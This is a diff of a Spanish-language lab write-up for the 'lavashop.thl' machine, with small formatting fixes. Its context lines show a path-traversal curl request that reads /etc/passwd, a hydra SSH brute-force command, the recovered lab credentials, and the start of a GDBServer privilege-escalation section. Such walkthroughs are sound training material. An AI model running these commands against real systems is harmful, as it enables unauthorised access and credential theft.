@@ -134,7 +134,7 @@ curl "http://lavashop.thl/pages/products.php?file=../../../../etc/passwd" | grep
 
 <img width="1261" height="64" alt="image" src="https://github.com/user-attachments/assets/d2c5d096-656e-480c-b3c6-b219aa40a193" />
 
-→ Revela usuarios `debian` (UID 1000) y `Rodri` (UID 1001), ambos con shell /bin/bashy login interactivo
+→ Revela usuarios `debian` (UID 1000) y `Rodri` (UID 1001), ambos con shell /bin/bash y login interactivo
 
 ## 5. Acceso Inicial — Fuerza Bruta SSH
 
@@ -150,7 +150,7 @@ hydra -l debian -P /usr/share/wordlists/rockyou.txt ssh://<IP>
 
 <img width="1194" height="224" alt="image" src="https://github.com/user-attachments/assets/bc2a6ecb-5d0b-4f1b-b9bf-cb6a8d966b11" />
 
-→ Credenciales válidas: **`Debian : 12345`**
+→ Credenciales válidas: `Debian : 12345`
 
 ```bash
 ssh debian@<IP>
@@ -159,6 +159,7 @@ ssh debian@<IP>
 ## 6. Escalada de privilegios — GDBServer
 
 ### 6.1 Enumeración
+
 ```bash
 sudo -l: no permitido
 su:      requiere contraseña de root
